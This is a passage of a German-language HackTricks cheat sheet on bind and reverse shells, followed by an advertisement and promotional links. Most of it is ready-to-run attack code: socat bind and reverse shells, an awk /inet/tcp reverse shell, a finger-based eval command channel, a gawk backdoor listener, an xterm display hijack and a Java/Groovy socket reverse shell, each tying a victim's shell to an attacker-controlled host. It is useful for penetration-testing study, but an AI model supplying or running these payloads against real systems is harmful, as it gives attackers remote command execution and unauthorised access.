```bash
socat TCP-LISTEN:<Port>,fork EXEC:/bin/bash
```

Ersetzen Sie `<Port>` durch den gewünschten Port, auf dem die Bind-Shell lauschen soll. Sobald der Befehl ausgeführt wird, wird Socat auf eingehende Verbindungen auf dem angegebenen Port warten und eine Shell-Sitzung starten, wenn eine Verbindung hergestellt wird.

Es ist wichtig zu beachten, dass die Verwendung einer Bind-Shell für illegale Aktivitäten illegal ist und nur zu Bildungszwecken oder mit ausdrücklicher Zustimmung des Zielrechners verwendet werden sollte.
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse Shell

Ein Reverse Shell ist eine Technik, bei der ein Angreifer eine Verbindung zu einem verwundbaren System herstellt und eine Shell-Sitzung auf diesem System öffnet. Im Gegensatz zu einer normalen Shell-Sitzung, bei der der Benutzer eine Verbindung zu einem entfernten System herstellt, ermöglicht ein Reverse Shell dem Angreifer, eine Verbindung von einem entfernten System zu seinem eigenen System herzustellen.

Ein Reverse Shell-Skript wird normalerweise auf dem verwundbaren System ausgeführt und stellt eine Verbindung zu einem vom Angreifer kontrollierten System her. Sobald die Verbindung hergestellt ist, kann der Angreifer Befehle auf dem verwundbaren System ausführen und auf Dateien, Dienste und Ressourcen zugreifen.

Die Verwendung eines Reverse Shells bietet dem Angreifer eine Reihe von Vorteilen, darunter:

- Umgehung von Firewalls und anderen Sicherheitsmaßnahmen, da die Verbindung vom verwundbaren System zum Angreifer hergestellt wird.
- Anonymität, da der Angreifer die Verbindung von seinem eigenen System aus initiiert.
- Fernzugriff auf das verwundbare System, um weitere Angriffe durchzuführen oder sensible Informationen zu stehlen.

Es gibt verschiedene Methoden, um einen Reverse Shell zu erstellen, einschließlich der Verwendung von Netcat, Python oder anderen Tools. Die Wahl der Methode hängt von den spezifischen Anforderungen und Einschränkungen des Angriffs ab.

Es ist wichtig zu beachten, dass das Erstellen und Verwenden eines Reverse Shells ohne die Zustimmung des Eigentümers des Systems illegal ist und zu rechtlichen Konsequenzen führen kann. Reverse Shells sollten nur zu legitimen Zwecken im Rahmen von Penetrationstests oder Sicherheitsaudits eingesetzt werden.
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk

Awk ist eine leistungsstarke Skriptsprache, die in Unix-ähnlichen Betriebssystemen verwendet wird, um Textzeilen zu verarbeiten und zu analysieren. Es ist besonders nützlich für die Extraktion und Manipulation von Daten in Textdateien.

Awk arbeitet zeilenweise und verwendet Muster-Matching, um bestimmte Zeilen zu identifizieren und Aktionen auf ihnen auszuführen. Es kann verwendet werden, um Textdateien zu durchsuchen, Daten zu filtern, Berechnungen durchzuführen und Berichte zu generieren.

Die Syntax von Awk besteht aus einer Reihe von Regeln, die aus einem Muster und einer Aktion bestehen. Das Muster definiert, welche Zeilen ausgewählt werden sollen, und die Aktion definiert, was mit den ausgewählten Zeilen geschehen soll.

Awk bietet eine Vielzahl von eingebauten Funktionen und Variablen, die zur Manipulation von Daten verwendet werden können. Es unterstützt auch die Verwendung von regulären Ausdrücken, um Muster zu definieren.

Um Awk zu verwenden, geben Sie einfach den Befehl "awk" gefolgt von den gewünschten Regeln und der zu verarbeitenden Datei ein. Awk kann auch in Shell-Skripten verwendet werden, um komplexe Aufgaben zu automatisieren.

Awk ist ein leistungsstarkes Werkzeug für die Datenverarbeitung und Analyse in Linux-Systemen. Es ist ein unverzichtbares Werkzeug für Hacker und Pentester, um Informationen aus Textdateien zu extrahieren und zu manipulieren.
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
Der Angreifer kann den Finger-Befehl verwenden, um Informationen über Benutzer auf dem Ziel-Linux-System zu erhalten. Der Befehl zeigt Informationen wie den Benutzernamen, den vollständigen Namen, die Shell, die letzte Anmeldung und die Benutzer-ID an. Der Finger-Befehl kann auch verwendet werden, um nach Benutzern zu suchen, die auf dem System angemeldet sind. 

Um den Finger-Befehl zu verwenden, kann der Angreifer den folgenden Befehl ausführen:

```shell
finger <Benutzername>
```

Der Befehl gibt dann die Informationen über den angegebenen Benutzer aus. 

Es ist wichtig zu beachten, dass der Finger-Dienst standardmäßig auf den meisten Linux-Systemen deaktiviert ist. Der Angreifer muss möglicherweise zuerst überprüfen, ob der Finger-Dienst auf dem Ziel-System aktiviert ist, bevor er den Finger-Befehl verwenden kann.
```bash
while true; do nc -l 79; done
```
Um den Befehl zu senden, schreiben Sie ihn auf, drücken Sie Enter und drücken Sie dann STRG+D (um STDIN zu stoppen)

**Opfer**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk

Gawk ist eine leistungsstarke Textverarbeitungssprache, die häufig in Linux-Systemen verwendet wird. Es ist ein leistungsfähiges Werkzeug für die Datenmanipulation und -analyse. Gawk kann verwendet werden, um Textdateien zu durchsuchen, Muster zu erkennen und Aktionen basierend auf den gefundenen Mustern auszuführen.

Einige der Hauptfunktionen von Gawk sind:

- **Mustererkennung**: Gawk kann nach bestimmten Mustern in Textdateien suchen und entsprechende Aktionen ausführen.
- **Textmanipulation**: Gawk ermöglicht die Manipulation von Textdateien, einschließlich Zeichenersetzung, Zeilenextraktion und -einfügung.
- **Variablen und Funktionen**: Gawk unterstützt die Verwendung von Variablen und Funktionen, um komplexe Aufgaben zu automatisieren.
- **Mathematische Operationen**: Gawk bietet eine Vielzahl von mathematischen Funktionen, die in Skripten verwendet werden können.
- **Dateiverarbeitung**: Gawk kann Textdateien zeilenweise verarbeiten und Daten aus verschiedenen Quellen lesen.

Gawk ist ein äußerst flexibles Werkzeug, das von Hackern und Systemadministratoren gleichermaßen verwendet wird. Es kann für verschiedene Aufgaben wie Datenanalyse, Log-Analyse und Skripting verwendet werden. Mit Gawk können Sie komplexe Aufgaben automatisieren und effizienter arbeiten.
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Dies versucht, eine Verbindung zu Ihrem System über den Port 6001 herzustellen:
```bash
xterm -display 10.0.0.1:1
```
Um die Reverse Shell zu empfangen, können Sie Folgendes verwenden (das auf Port 6001 lauscht):
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

von [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76) HINWEIS: Java Reverse Shell funktioniert auch für Groovy
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## Referenzen
* [https://highon.coffee/blog/reverse-shell-cheat-sheet/](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
* [http://pentestmonkey.net/cheat-sheet/shells/reverse-shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell)
* [https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)


<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Finden Sie die wichtigsten Schwachstellen, damit Sie sie schneller beheben können. Intruder verfolgt Ihre Angriffsfläche, führt proaktive Bedrohungsscans durch und findet Probleme in Ihrer gesamten Technologie-Stack, von APIs über Webanwendungen bis hin zu Cloud-Systemen. [**Probieren Sie es noch heute kostenlos aus**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks).

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Lernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks bewerben möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories senden.

</details>
